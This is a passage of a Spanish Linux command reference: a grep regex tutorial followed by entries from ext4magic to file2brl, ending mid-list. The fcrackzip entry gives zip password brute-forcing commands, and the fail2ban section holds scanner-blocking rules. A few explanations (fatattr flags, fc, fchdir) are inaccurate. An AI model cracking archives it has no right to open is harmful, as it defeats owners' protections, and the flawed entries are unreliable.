	la letra z es la última
	aminora
	mediaplayer es un reproductor
	tres cincos hace 555
	salta la rana
	aRmARIO
Nota.- Los siguientes ejemplos se basarán en el comando grep. En algunos casos, al corresponder a expresiones regulares extendidas, se usará con el argumento -E. Las expresiones regulares han de ir siempre encerradas con comillas simples.
	Literales (Sólo encajan con ellos mismos)
		$ grep 'media' file (mostrara las lineas que contengan "media" incluso "mediaplayer")
		$ grep '\<media\>' file (Sólo mostrará las que contengan exactamente "media")
	. [punto] (Cualquier caracter)
		$ grep 'me.ia' file (Misma salida que el anterior)
		$ grep '\<m...a\>' file (Mostrar las de cinco letras que empiecen por "m" y terminen en "a")
		$ grep 'm...a\>' file (Mostrar las lineas que contengan una palabra de cinco letras que empiece por "m" y termine con "a" sin nada a continuación)
	[] [Corchetes] (Cualquier caracter de los encerrados entre corchetes)
		$ grep '[wz]' file (Mostras las que contengan "w" o "z")
		$ grep 'sda[0-9]' file (Mostrar las lineas con palabras que empiecen por sda seguidas de un número del 0 al 9)
		$ grep '[0-9]-' file (Buscar lineas que tengan un número seguido de un -)
	| [Tuberia] (Especificar varias opciones)
		$ grep -E 'e(xt|rvi)(3|dor)' file (Mostrar las que contengan ext3 y ervidor [servidor])
		$ grep -E 'datos|servidor' file (Mostrar las que tengan las palabras "datos" y "servidor")
	- [Guión] (Siempre que no siga a un corchete, especifica un rango)
		$ grep '[0-2]$' file (Lineas que contengan los números 0,1 y 2)
	^ [Circunflejo] (Si va precedido de un corchete significa "todo lo que no sea lo que sigue". En los demás casos significa "que la linea empiece por lo que sigue)
		$ grep '^UUID' file (Mostrar las que empiecen por UUID)
		$ grep ':[^/]' file (Las que tengan ":" y no vayan seguidos de una "/")
		$ grep -e '^UUID' -e '^\/' file (Mostrar las que empiecen por UUID y por / . La barra de escape [\] convierte al siguiente caracter en literal)
	$ [Dolar] (Indica que el carácter precedente aparece al final de la linea)
		$ grep '0$' file (Muestra las que terminen en 0)
		grep '\.$' file (Muestra las lineas que terminan con un punto)
	+ [Signo más] (Una o más veces).
		$ grep -E '\-[0-9]+' file (Buscar las lineas con varios números precedidos por un guión [que ha de escaparse con una barra])
	* (Asterisco) (Ninguna o más veces)
		$ grep -E '(fot).*' file (Mostrar las que tengan "fot" y puedan estar o no seguidas de otros caracteres)
	? (Interrogante) (Un caracter impreciso)
		$ grep -E 'ext4?' file (indica que el caracter anterior [el 4] puede ser distinto de 4 o puede no existir, o sea que mostrará lineas que contengan ext4, ext3, ext...)
	{n,m} [Llaves] (Que el caracter anterior a la llave se muestre las veces que indica entre el número n y el m. Si omitimos m significa como mínimo n veces.
		$ grep '5\{2,5\}.*' file (Que se muestre las lineas que tengan un 5 entre dos y cinco veces. Las llaves se escapan)
		$ grep '5\{3\}.*' file (Muestra las lineas en las que el 5 sale tres veces)
		$ grep '5\{3,\}.*' file (Muestra las lineas en las que el 5 sale como mínimo tres veces)
	b (Que lo precedente sea el final de una palabra. Siempre ha de escaparse.)
		$ grep 's\b' file (Muestra las lineas que contienen alguna palabra acabada en "s")
Otros ejemplos:
Buscar las lineas que no empiecen por #:
	$ grep -v '^#' file
Mostrar lineas que empiecen por # y las que terminen en 0:
	$ grep -E '^#|0$' file
Buscar lineas que tengan : seguidos de una barra que ha de escaparse:
	$ grep ':\/' file
Buscar las lineas que tengan una "o" seguida de al menos 3 dígitos:
	$ grep 'o[0-9]\{3\}' file
Buscar lineas que tengan algún dígito:
	$ grep '[[:digit:]]' file
Buscar lineas que empiecen por un caracter alfabético:
	$ grep '^[[:alpha:]]' file
Buscar lineas que tengan "ext" usando parentesis:
	$ grep '\(ext\)' file
Buscar lineas que que tengan un número entre 2 y 9 al menos una vez y esten precedidos de espacio, tabulación o salto de linea:
	$grep -E '\s[2-9]+' file
Mostrar lineas con entre 3 y 6 letras mayúsculas:
	$ grep '[A-Z]\{3,6\}' file
Algunos casos comentados:
1.-
$ touch nada.8.sh.5
	$ ls | grep '.*.[6-8].*.[1-6]'
Nota.- Cuando se usen con el comando grep han de ir siempre encerradas con comillas simples.
	.* (Cero o más caracteres. El punto inicial es imprescindible)
	.[6-8] (Seguidos de un punto y un número que contenga entre el 6 y el 8)
	.* (seguido un punto y cero o más caracteres)
	.[1-6] (y terminado con un punto seguido de un número que contenga del 1 al 6)
Nota.- Los corchetes NO indican UN número de un dígito sinó un número que contenga el margen especificado [6,7,8 para el primer corchete y 1,2,3,4,5,6 para el segundo, por tanto también listaría el archivo nada.0357.sh.389 pero no nada.0352.sh.389 porque el número 0352 no contiene ninguno del margen especificado.
Nótese la diferencia en la expresión regular usando el comando mv [sin comillas simples y sin el punto delante del primer asterisco]:
	$ mv *.[6-8].*.[1-6] prueba
2.-
Buscar en el directorio scripts, todos los que sean de bash:
	$ grep -i '^#.*bash' scripts/*
		^#.*bash (Que el primer caracter de la primera linea sea # y que despues de cero o más caracteres aparezca la palabra bash)
		$ grep -i '$.*bash' scripts
		'$.*bash' (En todos los ficheros del directorio, que al final de la primera linea y despues de cero o más caracteres apararezca la palabra bash)
3.-
Ver los correos electrónicos completos de una lista en la que los hay incompletos:
$ cat lista
	juangomez@gmail.com
	clarafuentes@
	@yahoo.es
	ant.rodri-perez@hotmail.nadadenada
	pedro@blog.empresa.travel
	$ grep -E '^[a-zA-Z._-]+@[a-zA-Z0-9.]+\.[a-z]+$' lista
		^[a-zA-Z._-]+ (Que empiece con una palabra que pueda contener mayúsculas, minúsculas, puntos, guiones o guiones bajos)
		@ (Seguida de una @ literal)
		[a-zA-Z0-9.]+ (A continuación varios caracteres que pueden ser mayúsculas, minúsculas, puntos o números)
		\. (Después un punto literal)
		[a-z]+$ (Para terminar, uno o varios caracteres en minúscula)
	$ grep -E '^[a-zA-Z._-]+@.[a-zA-Z.0-9]+\.[[:alpha:]]{2,3}$' lista (Sólo mostrará las que terrminen con 2 o 3 letras)


ext4magic
Recuperación de ficheros ext3 y ext4 borrados o sobrescritos.
# ext4magic /dev/sda2 -m -d . -f user (recuperar sólo los archivos borrados [-m] de nuestra $HOME [/dev/sda2], el resultado en el presente directorio [-d .] y del usuario "user" [-f])
Algunas opciones:
-M (Emplear esta opción cuando se ha borrado todo el sistema de ficheros)


extundelete
[e2fsprogs, e2fslibs, e2fslibs-dev, g++, build-essential]. Recuperación de archivos o directorios borrados. La partición sobre la que se actua ha de estar desmontada. Descargar la aplicación de <http://extundelete.sourceforge.net/> e instalarla con el clasico ./configure, make, sudo make install.
# extundelete  /dev/sda11 --restore-directory /datos/dir_borrado (recuperar el directorio dir_borrado de la partición /dev/sda11. Lo guardará en el directorio RECOVERED_FILES)
# extundelete  /dev/sda11 --restore-file /datos/imagenes/foto.png -o fotos/ (recuperar un archivo y guardarlo en el directorio fotos)
# extundelete /dev/sda11 --restore-all (recuperar toda una partición)
# extundelete /dev/sda11 --restore-files files (recuperar de la partición /dev/sda11 los archivos enumerados en "files" a razón de uno por linea)


eza
Moderno reemplazo del clásico ls y el no mantenido exa.
$ eza (mostrar archivos y directorios sin los ocultos)
$ eza -l --group-directories-first (como el anterior pero los directorios primero)
$ eza -D (solo mostrar los directorios)
$ eza -a (mostrar todos incluidos los ocultos)
$ eza -T (en forma de arbol)


f3
[Fight Flash Fraud o Fight Fake Flash]. Prueba la capacidad total de una tarjeta flash [unidad flash, disco flash, pendrive]) para comprobar si coincide con las características que deberia tener. f3 escribe en la tarjeta y luego comprueba si puede leerla. No respeta los contenidos de la unidad o sea que es preferible que este vacia. Consta de varios ejecutables: f3brew, f3fix, f3probe, f3read y f3write.
# f3brew /dev/sda (detecta si el dispositivo es una unidad falsa)
# f3probe /dev/sda (identificar de forma rápida los falsos pendrives/tarjetas y ver su tamaño real)
# f3fix /dev/sda (comprobar la capacidad real del dispositivo que podemos utilizar para no perder datos)
# f3write /dev/sda (escribe archivos de gran tamaño en el dispositivo)
# f3read /dev/sda (Se encarga de comprobar que lo que ha escrito es correcto)
Algunas opciones que pueden aplicarse a algunos ejecutables:
        --destructive (obvia el contenido de la unidad para que el testeo sea más rápido)
        --time-ops (mostrar información sobre la duración de la comprobación)


facter
Muestra información del sistema tanto aspectos de hardware como de software.
$ facter (Muestra la totalidad de la información)
$ facter architecture kernel hardwaremodel kernelrelease ipaddress lsbdistdescription (Muestra sólo los aspectos especificados)


factor
Sacar todos los factores de un número.
$ factor 100


fail2ban
Cortafuegos. Habilitar los servicios en los que se quiera que actue el cortafuegos [ssh, apache2, ftp....] editando /etc/fail2ban/jail.conf y substituyendo el “false” por “true”. Algunos parámetros de este archivo son:
	ignoreip  (lista de IPs separadas por un espacio en blanco que no serán bloqueadas)
	bantime (tiempo en segundos que un host permanecerá bloqueado)
	maxretry (número máximo de intentos de login fallidos antes de ser bloqueado)
	filter (filtro usado según el archivo /etc/fail2ban/filter.d)
	logpath (archivo que utiliza para revisar los intentos de login)
Un ejemplo muestra de configuración para el servicio ssh:
	[ssh]
	enabled  = true
	port     = ssh
	filter   = sshd
	logpath  = /var/log/auth.log
	maxretry = 3
# tail -f /var/log/fail2ban.log | grep Ban    (monitorizar las ip baneadas)
# awk '($(NF-1) = /Ban/){print $NF}' /var/log/fail2ban.log | sort | uniq -c | sort (Solo muestra las Ips.)
# awk '($(NF-1) = /Ban/){print $NF,"("$NF")"}' /var/log/fail2ban.log | sort | logresolve | uniq -c | sort  (Mostrando el nombre del host)
# systemctl status fail2ban (comprobar el estado de fail2ban)
# fail2ban-client status (comprobar los servicios activos)
# fail2ban-client -i (entrar en el prompt de fail2ban)
# fail2ban-client status sshd (comprobar bloqueos de ips por ataques a ssh)
# fail2ban-client set mysqld-auth unbanip IP (borrar una ip bloqueada del servicio mysql-auth)
# fail2ban-testcases (realizar un test general))
1.-
Bloquear errores w00tw00t.at.ISC.SANS en los logs de apache. En realidad estas peticiones no acaban en ningún ataque concreto. Estan producidos por el escaner de puertos Dfind que al generar sus peticiones coloca "w00tw00t.at.ISC.SANS.DFind".
Crear el archivo:
# nano /etc/fail2ban/filter.d/apache-w00tw00t.conf
Pegar el siguiente contenido:
	[Definition]
	failregex = ^.*\[client <HOST>\].*w00tw00t\.at\.ISC\.SANS\.*.*
	ignoreregex =
Añadir la jaula:
# nano /etc/fail2ban/jail.conf
Y pegar:
	[apache-w00tw00t]
	enabled = true
	filter = apache-w00tw00t
	action = iptables-allports[name=w00tw00t]
	logpath = /var/log/apache*/error.*.log
	maxretry = 1
	bantime = -1
Nota.- el bantime = -1 indica bloquear permanentemente.
2.-
Algunos ajustes de jail.conf para el caso de usar nginx y no apache:
# nano /etc/fail2ban/jail.conf
Prevenir ataques de inyeccion de codigo
	[php-url-fopen]
	enabled = true
	port    = http,https
	filter  = php-url-fopen
	logpath = /var/log/nginx/access_log
	maxretry = 1
Bloquea por iptables un día a los hosts que se conectan haciendo  uso de un "User Agent" sospechoso
	[nginx-badbots]
	enabled  = true
	filter = apache-badbots
	action = iptables-multiport[name=BadBots, port="http,https"]
	logpath = /var/log/nginx*/*access*.log
	bantime = 86400
	maxretry = 1
Solicitar 240 páginas en 1 minuto o 4 paginas segundo, bloqueo por dos dias
	[nginx-dos]
	enabled = true
	port    = http,8090
	filter  = nginx-dos
	logpath = /var/log/nginx/access.log
	findtime = 60
	bantime  = 172800
	maxretry = 240
Fallar la autentificación en el servidor web, bloqueo por 10 minutos
	[nginx-auth]
	enabled = true
	port = http
	filter = nginx-auth


faillock
Herramienta para visualizar y modificar la autenticación archivos de registro de fallas. Muy parecida a faillog.
# faillock --dir /var/log (directorio donde se guardan los registros de intentos fallidos)
# faillock --user USER


faillog
El módulo pam_faillock.so mantiene una lista de intentos fallidos de autentificación por usuario durante un intervalo especificado y bloquea la cuenta en caso de que hubiera varios intentos consecutivos de autentificaciones fallidas.
# faillog -u USER (de un usuario)
# faillog -r -u USER (borrar los registros del usuario mencionado)
# faillog -a (todos)


faked-tcp
[fakeroot]. Demonio que recuerda la propiedad/permisos falsos de archivos manipulados por procesos fakeroot.
# faked-tcp --debug (muestra información por pantalla)


fakeroot
Ejecuta comandos en un entorno que simula privilegios de root. No aumenta los privilegios de un usuario ni disminuye la seguridad del sistema. Este paquete consta de los ejecutable: faked-sysv, faked-tcp, fakeroot-sysv y fakeroot-tcp
$ fakeroot -u dpkg-repack paquete (Crea un archivo .deb a partir de un paquete instalado en el sistema.)
$ fakeroot /bin/bash (ejecutar bash como root)


false
Este comando no hace nada excepto devolver un estado de salida 1 (fail). Se utiliza como marcador de posición en scripts.


falselogin
Tipo de 'shell' que no permite al usuario iniciar sesión.
$ falselogin (muestra el mensaje, que puede modificarse, de /etc/falselogin.conf)
$ falselogin --wait 5 (espera 5 segundos antes de cerrarse)


fallocate
Manipular el espacio de disco asignado a un archivo.
$ fallocate -l 20G archivo.txt (Como si el archivo.txt tuviera 20G)


fastfech
Herramienta para obtener información del sistema y mostrarla de una manera atractiva.
$ fastfetch
$ fastfetch --list-config-paths (muestra el listado de los archivos de configuracion de la aplicación)
$ fastfetch --list-logos (llistado de logos disponible en la aplicación)
$ fastfetch -d arch (muestra información del sistema sea la distro que sea pero con el logo de arch)


fatattr
Permite ver y/o modificar los atributos MSDOS en un sistema de archivos FAT empleando los signos + para otorgar y - para quitar. Dichos premisos son:
    r (Solo lectura)
    a (Archivo)
    s (Archivo del sistema)
    h (Oculto)
    d (Directorio)
    v (Etiqueta de volumen)
$ fatattr /media/usb1/* (Muestra los atributos)
$ fatattr -s /media/usb1/* (Quita el atributo oculto de todo el usb)
$ fatattr +s /media/usb1/* (Oculta todos los archivos del usb)


fatlabel
Establecer u obtener la etiqueta del sistema de archivos MS-DOS o la ID del volumen.
$ fatlabel /dev/sda1 (Obtener la etiqueta de una partición FAT32)
$ fatlabel /dev/sda1 Nueva-etiqueta (establecer nueva-etiqueta a la partición)


fbcmd
[php5-cli php5-curl]. Cliente de línea de comandos para Facebook.
$ php -r 'echo phpversion();' (Comprobar si php5 está instalado)
$ php -r 'phpinfo();' | grep -i curl (Comprobar si php tiene soporte para curl)
$ wget https://raw.github.com/dtompkins/fbcmd/master/fbcmd_update.php (Descargar fbcmd)
$ php fbcmd_update.php (Preparar la instalación)
$ php fbcmd_update.php sudo
$ php fbcmd_update.php
$ fbcmd (Arrancar la aplicación. Mostrará una url del tipo https://www.facebook.com/dialog/oauth?client_id=424....)
Entrar en fecebook con la url mencionada y aceptar la conexión de la aplicación. Mostrará un código XXXXX
$ fbcmd auth XXXXX (Autentificarse con el código)
Aceptar los terminos que nos proponen y acabar la configuración.
$ fbcmd update (Actualizar la versión)
$ fbcmd post "Estoy posteando en consola" (Enviar una entrada)
$ fbcmd target USER post "Texto al muro de USER"
$ fbcmd @USER post "Texto al muro de USER"
$ fbcmd fstatus (Ver estado de tus amigos)
$ fbcmd fonline (Mostrar los amigos que están actualmente en línea)
$ fbcmd stream (Mostrar streaming de los amigos)
$ fbcmd comment 5 "texto de comentario" (Agregar un comentario)


fbgrab
Realizar pantallazos desde las X y desde las tty1-6
# fbgrab -s 2 pantallazo.png   (pantallazo despues de 2 segundos)
# fbgrab -C 3 captura.png (desde las X a la tty 3)


fbgs
Visualizar pdf usando framebuffer [sin X]
$ fbgs -c archivo.pdf  (visualizarlo en color)
Opciones:
	-l  (Ampliación a 100 dpi (75 dpi por defecto)
	-xl (a 12 dpi)
	-xxl (a 150 dpi)
	-p contraseña (Si el pdf requiera contraseña)


fbi
Visualizar imagenes usando framebuffer [sin X]. Precisa root.
# fbi -t 3 *   (visualizar 3 segundos todas las imágenes del directorio)
Si sale una nota: ioctl VT_GETSTATE: Invalid argument [not a linux console?] :
# fbi -vt 01 imagen


fbset
Mostrar y modificar la configuración de los dispositivos framebuffer.
# fbset -i  (Muestra toda la información disponible)
# fbset -s  (visualizar la configuración en modo vídeo)


fbsetbg
Herramienta para colocar fondos de pantalla en escritorios minimalistas: fluxbox, openbox...
$ fbsetbg -l $HOME/imagenes/imagen.png (colocar fondo)
$ fbsetbg -i (información sobre el “setter” [feh, esetroot...] usado)


fbterm
Terminal basada en framebuffer [tty].
$ fbterm -f 0 -b 2 -s 20 (Color de fuente[-f] negra[0], fondo[-b] verde[2] y fuente[-s] de 20 pixels)
$ fbterm -r 2 -n Purisa (invierte la terminal y usa fuente Purisa [-n]. Listado de fuentes posibles con fc-list)
Nota.- Con Ctrl+d la terminal vuelve a su condición anterior.
Colores permitidos [-f, -b]:
0 = negro, 1 = rojo, 2 = verde, 3 = marrón, 4 = azul, 5 = magenta, 6 = cyan, 7 = blanco
Rotaciones de terminal posibles (-r):
0 = 0º , 1 = 90º, 2 = 180º, 3 = 270º


fbtv
Visualizar la webcam por las tty.
# fbtv -f /usr/share/consolefonts/Lat2-Fixed13.psf.gz -c /dev/video0


fbv
Visualizar imágenes en framebuffer.
$ fbv imagen


fc
Mostrar/abrir nuevamente el último comando/archivo abierto o ejecutado. La diferencia con history [ver] es que fc sólo muestra los ultimos comandos ejecutados y no todos.
$ fc -l (Mostrar los últimos comandos usados por el usuario)
$ fc 534 (Edita el comando con el pid 534 y lo ejecuta nuevamente)
$ !! (Ejecuta el último comando)
$ !n (Ejecuta el comando número n)
$ !dialog (Ejecuta el último comando que empiece por dialog)


fc-cache
Regenerar la cache de fuentes instaladas
$ fc-cache -f -v


fchdir
Es idéntico a chdir con la única diferencia de que el directorio se proporciona como un descriptor de archivo abierto, es decir que devuelve 0 si puede ir al directorio especificado o 1 si no.
$ fchdir /ust/local/bin (devolverá 1)


fc-list
Listar todas las fuentes disponibles.
$ fc-list | cut -d ':' -f 1 | sort -u  (de forma más clara)
$ fc-list > lista_fuentes.txt   (redirigir la lista de fuentes a un fichero)
$ fc-list | wc -l  (muestra el número de fuentes disponibles)


fcgistarter
Iniciar un programa FastCGI. FastCGI es un protocolo para interconectar programas interactivos con un servidor web. El principal objetivo de FastCGI es reducir la carga asociada con el hecho de interconectar el servidor web y los programas Common Gateway Interface, permitiéndole a un servidor atender más peticiones a la vez.
# fcgistarter -c command.cgi -p port -i eth0 -N num


fcrackzip
Craquear zips protegidos
$ fcrackzip -c aA1 -l 5 archivo_protegido.zip
$ fcrackzip -b -c a -u -l 1-6 archivo_protegido.zip
-c aA1!  (Prueba minúsculas, mayúsculas, números y caracteres especiales [!:$%&/()=?{[]}+*~#])
-c a (Que pruebe solo minúsculas de la a a la z)
-l 3-5  (Entre 3 y 5 caracteres)
-b  (fuerza bruta)
-u  (utilice unzip para eliminar contraseñas incorrectas)


fd
[fdclone]. Gestor de archivos minimalista sin soporte para colores, acentos y letra "ñ"
Algunos atajos:
	Flechas (Desplazamiento)
	1 (Muestra los archivos en una columna)
	2 (Muestra los archivos en dos columnas)
	3 (Muestra los archivos en tres columnas)
	l (Ir a)
	t (Muestra el árbol de carpetas)
	u (Descomprimir usando el descompresor de FD)
	a (Cambia las propiedades de un archivo.
	i (Información del disco duro actual)
	p (Comprime un o varios archivos)
	h (Ejecutar un comando)
	F (Buscar de forma recursiva)
	/ (Partir la pantalla en dos)
	K (Cerrar pestaña)
	^ (Cambia de pestaña)
	E (Abre preferencias)


fdfind
Alternativa rápida al comando find para buscar patrones.
$ fdfind bash /etc (que tengan "bash" en /etc)
$ fdfind '^x.*rc$' /etc (que empiecen por "x" y terminen con "rc" en el directorio /etc)
$ fdfind -s txt (que tengan determinada extensión)


fdformat
Formatear disquetes.
# fdformat -n /dev/fd0 (sin verificar)
# fdformat -r /dev/fd0 (reparar el formateo)


fdisk
Particionar discos.
# fdisk -l (Lista las particiones de todos los discos y entra en el promtp del comando)
Algunas teclas que pueden usarse:
	d   (Suprime una partición)
	l   (Lista los tipos de particiones conocidos)
	m   (Imprime este menú)
	n   (Añade nueva partición)
	o   (Crea una nueva tabla de particiones DOS vacía)
	p   (Imprime la tabla de particiones)
	q   (Sale sin guardar los cambios)
	v   (Verifica la tabla de particiones)
	w   (Escribe la tabla en el disco y sale)
Y seguir las instrucciones que aparecen en pantalla.


fdupes
Buscar archivos duplicados.
$ fdupes -r .  (Del directorio actual y los subdire4ctorios)
$ fdupes -S .  (Del directorio actual por medida)
Otras opciones:
	-s (Comprueba los enlaces simbolicos)
	-h (comprueba los enlaces fuertes)
	-q ("quiet", oculta el indicador de progreso)
	-v (muestra la version)
	-d (borrar los ficheros duplicados)
	-h (ayuda)
	-n (descarta los ficheros vacios)


feh
Visor de imagenes liviano.
$ feh /home/usuario/imagenes (Muestra las imagenes del directorio)
$ feh -g 800x600 -S filename -D 1.5 /home/usuario/imagenes (Que las muestre a 800x600 pixels conservando proporciones, alfabéticamente [-s filename] y con intervalos de 1,5 segundos)
$ feh -w /home/usuario/imagenes (Las abre todas en ventanas distintas)
$ feh -i -r -e .fonts/Annabel.ttf/10 -O index.jpg /home/usuario/imagenes (Crea una imagen con los thumbnails de las imagenes del directorio y los subdirectorios [-r] con nombre [-O index.jpg] y colocando el nombre de la imagen con la fuente Annabel a 10 puntos. Ha de especificarse la ruta a la fuente)
$ feh -m /home/usuario/imagenes (Crea una imagen con todas las imágenes del directorio especificado como con -i pero sin poner el nombre)
$ feh -kR 10 http://192.168.1.9/img/video.asf (Grabar un video de 10 segundos de una cámara ip en el presente directorio)
$ feh --bg-scale /home/usuario/imagenes/image.jpg (Colocar una imagen de fondo de pantalla de forma escalada [bg-tile: mosaico, bg-center: centrado, bg-fill: escalado proporcional y bg-max: escalado y proporcional con razón de aspecto)
$ feh http://URL/imagen.png (Visualizar una imagen a partir de una URL)


ferm
Cortafuegos que en realidad tiene debajo a iptables . El archivo de configuración se crea en /etc/ferm/ferm.conf y las reglas personales se pueden organizar en /etc/ferm/ferm.d/local.conf.
# import-ferm > /etc/ferm/ferm.d/personal.conf (importar reglas de iptables)
# import-ferm /etc/iptables/rules.v4 > /etc/ferm/ferm.d/personal.conf (importar reglas de iptables-persistent)
# ferm -i  -t 10 /etc/ferm/ferm.conf (cargar la aplicación en 10 segundos [predeterminado 30 segundos])
# ferm -nl /etc/ferm/ferm.d/personal.conf (ver las reglas importadas de iptables)
# ferm --flush /etc/ferm/ferm.conf (eliminar todas las reglas)
Ejemplo de archivo de configuración. Con iptables sería de la siguiente forma:
        iptables -A INPUT -p tcp -j ACCEPT
        iptables -A OUTPUT -p tcp -j ACCEPT
        iptables -A INPUT -p udp -j ACCEPT
        iptables -A OUTPUT -p udp -j ACCEPT
Con Ferm:
    domain ip {
           table filter {
           chain (INPUT OUTPUT) {
           proto (udp tcp) ACCEPT;}
           }
    }


fernapp
[openjdk-6-jre unzip xvfb libxcomposite1 libxdamage1 x11-xkb-utils]. Acceso a aplicaciones gráficas desde el navegador. Descarga: https://bitbucket.org/MarkusKramer/fernapp/downloads/ una vez descomprimido el paquete:
$ cd fernapp
$ sudo chmod +x fernapp-server.sh
$ ./fernapp-server.sh libreoffice (indicar la aplicacion que quiere compartirse)
En el navegador remoto se accede por: http://localhost:8080/index.html y la contraseña 123


festival
[festival festvox-ellpc11k]. Sintetizador de voz.
$ echo “Linux es genial” | festival --tts --language spanish
$ festival --tts --language spanish archivo.txt
Nota.- Si al lanzar la aplicación nos muestra una salida: “Linux: can't open /dev/dsp”, crear el fichero .festivalrc en nuestra $HOME pegando el siguiente contenido:
	(Parameter.set 'Audio_Command "aplay -q -c 1 -t raw -f s16 -r $SR $FILE")
	(Parameter.set 'Audio_Method 'Audio_Command)


fetch
[procps imagemagick w3m-img wmctrl feh mpc scrot x11-utils]. Mostrar información del sistema. Descarga e instalación:
	$ git clone https://github.com/dylanaraps/fetch
	$ cd fetch
	$ sudo make install
$ fetch --ascii


fex
[Fast File EXchange de Frams]. Servicio que permite intercambiar archivos muy grandes de forma rápida y cómoda. El remitente carga el archivo en el servidor FEX y el destinatario recibe automáticamente un correo electrónico de notificación con una URL de descarga.


fff
[Fucking Fast File-manager]. Gestor de archivos escrito en Bash que permite explorar archivos y gestionarlos de manera rápida desde la línea de comandos.
Descarga e instalación:
	$ curl https://raw.githubusercontent.com/dylanaraps/fff/master/fff > fff
	$ chmod +x fff
	# mv fff /usr/bin
$ fff
Teclas para la gestión:
	j (bajar cursor)
	k (subir cursor)
	h (carpeta precedente)
	l (entrar en subcarpeta
	enter (entrar en subcarpeta)
	g (ir al inicio)
	G (ir al final)
	. (ver/ocultar archivos ocultos)
	/ (buscar)
	t (ir a la papelera)
	~ (ir al directorio home)
	[1-9] (favoritos)
	↓ (bajar cursor)
	↑ (subir cursor)
	← (ir a la carpeta precedente)
	→ (entrar en subcarpeta)
	f (nuevo archivo)
	n (nueva carpeta)
	y (marcar para copiar)
	m (marcar para mover)
	p (pegar/mover)
	r (renombrar)
	d (borrar [~/.cache/fff/trash/])
	q (salir)


ffmpeg
Conversor de archivos de audio y video. La aplicación contiene otros ejecutables: ffplay, ffprobe y qt-faststart
$ ffmpeg -i archivo.mpg  (Obtener información de un archivo)
$ ffmpeg -i archivo1.avi archivo2.mpg  (Convertir de un formato a otro)
$ ffmpeg -i archivo1.3gp -vcodec mpeg4 -acodec mp3 archivo2.avi (Convertir videos en formato 3gp del móvil a avi)
$ ffmpeg -i archivo1.avi archivo2.mpg -s 640×480 -b 800 (Cambiar formato especificando bitrate y resolución del archivo de salida)
$ ffmpeg -i archivo.avi -vn -acodec copy audio.mp3 (Extraer el audio de un archivo de video)
$ ffmpeg -i input.flac -ab 196k -ac 2 -ar 48000 output.mp3 (De flac a mp3)
$ ffmpeg -i archivo.avi -an -vcodec copy video.avi  (Extraer el video de un archivo sin el audio)
$ ffmpeg -i movie.avi -acodec mp3 -ar 11025 movie.flv  (de avi a flv)
$ ffmpeg -i music.mp3 -acodec amr_nb -ar 8000 -ac 1 -ab 32 music.amr (de mp3 a amr)
$ ffmpeg -i video.mpg -f mp3 audio_track.mp3 (de mpeg a mp)
$ ffmpeg -i myfile.avi -target pal-vcd myfile_vcd.mpg (de avi a vcd)
$ ffmpeg -i music.wav -acodec amr_nb -ar 8000 -ac 1 -ab 32 music.amr (de wav a amr)
$ ffmpeg -i video_1 -t 9 video_2 (video_2 tendrá los 9 primeros segundos de video_1)
$ ffmpeg -i video_1 -ss 9 -t 15 video_2 (video_2 empezarà en el minuto 9 de video_1 y durará 15 segundos a partir de este punto)
$ ffmpeg -i archivo.mpeg -s qcif -r 12 -ac 1 -ar 8000 -b 30 -ab 12 salida.3gp (de mpeg a 3gp)
$ ffmpeg -i pelicula.mpg -acodec mp3 -vcodec xvid -b 687 pelicula.avi (de mpeg a Xcid)
$ ffmpeg -i pelicula.mpg -vcodec flv -y pelicula.flv (de mpeg a flv)
$ ffmpeg -f image2 -i imagenes%d.jpg video.mpeg  (Convertir una secuencia de imagenes a video)
$ ffmpeg -i video -sameq -r 1 %d.png (sacar un fotograma png cada segundo de un video)
$ ffmpeg -i video.avi video.mpg -s 640×480 -b 800  (convertir de avi mpg especificando resolución y bitrate)
$ ffmpeg -i video.mpeg -pix_fmt rgb24 imagenes.gif (Convertir imagenes de un video a .gif animado)
$ ffmpeg -i nuevo_video.mpeg -sameq nuevo_video.avi (de mpeg a avi)
$ ffmpeg -i video.avi -an video_sin_sonido.avi (Suprimir el audio de un video)
$ ffmpeg -i video.avi audio.mp3 (Separar para guardar el sonido de un video)
$ ffmpeg -i audio.mp3 -i montaje.avi video_final.avi (Añadir sonido a un video sin él)
Nota.- Si el audio.mp3 es más largo que el montaje.avi el resultado final tendrá la duración del audio y viceversa.
$ ffmpeg -f alsa -ac 2 -i hw:0,0 -f x11grab -r 30 -s $(xwininfo -root | grep 'geometry' | awk '{print $2;}') -i :0.0 -acodec pcm_s16le -vcodec libx264 -vpre lossless_ultrafast -threads 0 -y output.mkv  (crear un video del escritorio)
$ ffmpeg -f x11grab -r 25 -s 800x600 -i :0.0 video.mpg (lo mismo. Alguien ha de estar visualizando la sesión)
$ ffmpeg -f x11grab -s 1280x1024 -r 25 -i :0.0 -sameq /home/usuario/video.mpg (Grabar escritorio)
$ ffmpeg -loop_input -i imagen.png -vframes 500 -an video.avi (Crear video.avi de 500 segundos mostrando una imagen)
$ ffmpeg -itsoffset -4 -i video.avi -vcodec mjpeg -vframes 1 -an -f rawvideo -s 320x240 test.jpg (Sacar un tumbnail de un video)
$ ffmpeg -ss 5 -i video.mpegi -vframes 1 -s 320x240 thumb.jpg (lo mismo)
$ ffmpeg -i http://192.168.1.115/img/video.asf -vcodec copy -b 900k salida.asf (Grabar un video de una ubicación en la red [cámara ip])
$ ffmpeg -i ./PELICULA_ENTRADA.MOV -s 800x450 -vcodec libxvid -acodec aac -strict experimental -ac 2 -r 25 -ab 44100 -b 500k -aspect 16:9 fichero_salida.mp4 (Convertir un vídeo a un formato reconocido por Android)
1. Unir varios videos
$ ffmpeg -i video1.avi -sameq video1.mpeg (Primero convertirlos a mpeg))
$ ffmpeg -i video2.avi -sameq video2.mpeg
$ cat video1.mpeg video2.mpeg > nuevo_video.mpeg (Unir los videos resultantes usando cat)


fg
Pasa un proceso a primer plano.
$ fg PID
$ fg %2 (Regresa a foreground el proceso num2)


fgconsole
Muestra el número de terminal activo.
$ fgconsole


fgrep
(fast grep). Busca cadenas de texto fijas. Ignora el significado especial de los metacaracteres.


figlet
Baners
$ figlet texto (forma básica)
$ showfigfonts    (visualizar las tipografias del comando)
$ figlet -f banner texto  (especificando tipografía)
Opciones
	-c (centra el texto de salida)
	-l (alinea el texto a la izquierda)
	-r (alinea el texto a la derecha)
	-w (establece un tamaño máximo)
	-t (Con la anchura máxima que permite la terminal)


figlist
Lista las fuentes disponibles en figlet.
# figlist
# figlist -d /usr/share/figlet


file
Indica el tipo y codificación de un fichero.
$ file script.sh
$ file Desktop
$ file archivo.odt
$ file -i archivo
$ file --mime-encoding archivo.txt (Mostrar codificación)


file2brl
Convierta un archivo xml, html o de texto en un archivo braille.
$ file2brl texto.txt text-braile.txt


filefrag
